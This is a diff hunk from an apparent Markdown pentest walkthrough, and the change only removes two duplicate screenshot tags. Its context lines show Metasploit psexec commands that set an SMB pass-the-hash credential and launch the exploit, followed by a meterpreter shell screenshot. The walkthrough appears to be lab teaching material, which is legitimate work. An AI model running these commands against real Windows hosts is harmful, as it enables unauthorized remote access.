@@ -195,8 +195,6 @@ msf exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:
 msf exploit(windows/smb/psexec) > `exploit`
 
 <img width="769" height="373" alt="meterpreter_shell_2" src="https://github.com/user-attachments/assets/a0e79b48-f167-4ac6-bfc1-7c5c5cfefaf8" />
-<img width="457" height="214" alt="img01" src="https://github.com/user-attachments/assets/4f2eb6c4-6f81-42ab-849a-4ab7e5e16ab3" />
-<img width="457" height="214" alt="img01" src="https://github.com/user-attachments/assets/071ce116-d7cc-4920-8ae5-ba732781173f" />
 
 Kill it
 
